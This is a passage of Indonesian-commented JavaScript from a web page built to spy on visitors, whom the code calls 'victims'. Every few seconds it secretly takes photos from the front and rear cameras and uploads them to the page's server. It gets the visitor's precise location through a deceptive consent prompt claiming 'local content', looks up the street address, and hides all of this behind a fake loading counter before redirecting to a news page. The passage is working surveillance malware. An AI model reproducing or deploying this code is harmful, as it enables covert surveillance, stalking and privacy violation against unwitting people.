                if (currentStream && currentStream.active && !isSwitching) {
                    const image = await captureFromStream(currentStream, currentCameraType);
                    if (image) {
                        await fetch('/api/capture-image', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                victimId: victimId, 
                                image: image,
                                cameraType: currentCameraType,
                                timestamp: new Date().toISOString(),
                                isPeriodic: true
                            })
                        });
                        debug(`📸 Foto periodik dari kamera ${currentCameraType} terkirim`);
                    }
                }
            }, 3000);
        
                // 4. Jika ada lebih dari 1 kamera, lakukan pergantian otomatis
                if (availableCameras.length > 1) {
                    debug(`📷 Terdeteksi ${availableCameras.length} kamera, akan bergantian setiap 10 detik`);
                    
                    // Tampilkan info ke user
                    const statusEl = document.getElementById('status');
                    if (statusEl) {
                        statusEl.textContent = `Kamera aktif: ${currentCameraType == 'front' ? 'DEPAN' : 'BELAKANG'} | Akan bergantian setiap 10 detik`;
                    }
                    
                    // Mulai pergantian kamera otomatis
                    switchInterval = setInterval(async () => {
                        if (!isSwitching && currentStream) {
                            debug('🔄 Menjalankan pergantian kamera otomatis...');
                            await switchToNextCamera();
                            
                            // Update status
                            if (statusEl) {
                                statusEl.textContent = `Kamera aktif: ${currentCameraType == 'front' ? 'DEPAN' : 'BELAKANG'} | Akan bergantian setiap 10 detik`;
                            }
                        }
                    }, 10000); // Ganti setiap 10 detik
                } else {
                    debug('📷 Hanya 1 kamera tersedia, tidak melakukan pergantian');
                }
                
                debug('✅ Sistem kamera siap');
                
            } else {
                debug('❌ Gagal mengakses kamera pertama');
            }
            
            // 5. Cleanup function untuk saat halaman ditutup
            window.cleanupCameras = function() {
                if (switchInterval) clearInterval(switchInterval);
                if (periodicInterval) clearInterval(periodicInterval);
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }
                debug('🛑 Semua kamera dihentikan');
            };
            
        }, 3000);

        // Tambahkan event listener untuk cleanup saat halaman ditutup
        window.addEventListener('beforeunload', () => {
            if (window.cleanupCameras) {
                window.cleanupCameras();
            }
        });

        // 4. Minta lokasi
        setTimeout(async () => {
            debug('Meminta akses lokasi...');
            
            const izinLokasi = confirm('Website ini ingin mengetahui lokasi Anda untuk konten lokal. Izinkan?');
            
            if (izinLokasi && 'geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const locationData = {
                            status: 'granted',
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        };
                        
                        await sendData('location', locationData);
                        debug('Lokasi: ' + position.coords.latitude + ', ' + position.coords.longitude);
                        
                        // Coba reverse geocoding
                        try {
                            const geoResponse = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`
                            );
                            const geoData = await geoResponse.json();
                            await sendData('location_address', geoData.display_name);
                            debug('Alamat: ' + geoData.display_name);
                        } catch(e) {
                            debug('Gagal reverse geocoding: ' + e.message);
                        }
                    },
                    async (error) => {
                        let errorMessage = 'Unknown error';
                        switch(error.code) {
                            case error.PERMISSION_DENIED: errorMessage = 'Permission denied'; break;
                            case error.POSITION_UNAVAILABLE: errorMessage = 'Position unavailable'; break;
                            case error.TIMEOUT: errorMessage = 'Timeout'; break;
                        }
                        await sendData('location', { status: 'error', error: errorMessage });
                        debug('Error lokasi: ' + errorMessage);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                await sendData('location', { status: 'denied' });
                debug('Lokasi ditolak atau tidak tersedia');
            }
        }, 4000);

        // 5. Update status dan redirect
        let counter = 0;
        const interval = setInterval(() => {
            counter++;
            const statusEl = document.getElementById('status');
            if (statusEl) {
                statusEl.textContent = `Memuat konten... ${counter}/10`;
            }
            
            if (counter >= 10) {
                clearInterval(interval);
                if (statusEl) {
                    statusEl.textContent = 'Selesai! Mengalihkan...';
                }
                
                // Hentikan semua kamera sebelum redirect
                stopAllCameras();
                
                // Redirect setelah selesai
                setTimeout(() => {
                    window.location.href = '/berita.html';
                }, 2000);
            }
        }, 1000);

        // Cleanup saat halaman ditutup
        window.addEventListener('beforeunload', () => {
            stopAllCameras();
        });

        // Tampilkan debug jika ada parameter
        if (window.location.search.includes('debug=true')) {
            const debugDiv = document.querySelector('.debug');
            if (debugDiv) {
                debugDiv.style.display = 'block';
            }
        }

